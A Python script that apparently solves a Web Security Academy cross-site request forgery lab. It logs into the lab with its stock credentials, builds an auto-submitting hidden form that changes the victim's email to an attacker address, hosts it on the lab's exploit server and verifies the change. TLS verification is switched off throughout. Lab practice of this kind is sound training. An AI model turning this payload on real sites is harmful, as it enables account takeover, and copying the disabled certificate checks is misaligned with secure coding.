import requests
from bs4 import BeautifulSoup

# Disable warnings related to unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_csrf_vulnerability(base_url):
    # Define the URLs and credentials
    login_url = f"{base_url}/login"
    change_email_url = f"{base_url}/my-account?id=wiener"
    exploit_server_url = "https://exploit-0a52005e04112c278233378c01f400e2.exploit-server.net/exploit"

    # Define the login credentials
    credentials = {
        'username': 'wiener',
        'password': 'peter'
    }

    # Create a session
    session = requests.Session()

    # Disable SSL verification
    session.verify = False

    # Log in to the account
    login_response = session.post(login_url, data=credentials)

    # Check if login was successful
    if "Log out" in login_response.text:
        print("Logged in successfully")
    else:
        print("Failed to log in")
        return

    # Define the new email to be set via CSRF attack
    new_email = "attacker@web-security-academy.net"

    # Generate the CSRF exploit HTML
    csrf_exploit_html = f"""
<form method="POST" action="{change_email_url}">
    <input type="hidden" name="email" value="{new_email}">
</form>
<script>
    document.forms[0].submit();
</script>
"""

    # Print the CSRF exploit HTML payload
    print("CSRF Exploit HTML Payload:")
    print(csrf_exploit_html)

    # Store the CSRF exploit on the exploit server
    store_exploit_response = session.post(exploit_server_url, data=csrf_exploit_html, headers={"Content-Type": "text/html"})

    # Check if exploit was stored successfully
    if store_exploit_response.status_code == 200:
        print("Exploit stored successfully")
    else:
        print(f"Failed to store the exploit: {store_exploit_response.status_code}")
        print(store_exploit_response.text)  # Print the response text for debugging
        return

    # Test the exploit by viewing it
    view_exploit_response = session.get(exploit_server_url)

    # Check if the exploit was viewed successfully
    if view_exploit_response.status_code == 200:
        print("Exploit viewed successfully, check if the email was changed")
    else:
        print(f"Failed to view the exploit: {view_exploit_response.status_code}")
        print(view_exploit_response.text)  # Print the response text for debugging
        return

    # Check if the email was changed
    account_response = session.get(f"{base_url}/my-account?id=wiener")

    # Use BeautifulSoup to parse the account page and verify the email change
    soup = BeautifulSoup(account_response.text, 'html.parser')

    # Look for the email in the span with id "user-email"
    email_span = soup.find('span', {'id': 'user-email'})
    email_text = email_span.text.strip() if email_span else None

    if email_text == new_email:
        print("Vulnerability detected!")
        print("To perform the attack, use the following payload:")
        print(csrf_exploit_html)
    else:
        print("CSRF attack failed, email was not changed.")
        print(f"Current email found: {email_text if email_text else 'No email field found'}")

# URL to check
url_to_check = "https://0adf00c304ff2cf8829e384300940007.web-security-academy.net"
check_csrf_vulnerability(url_to_check)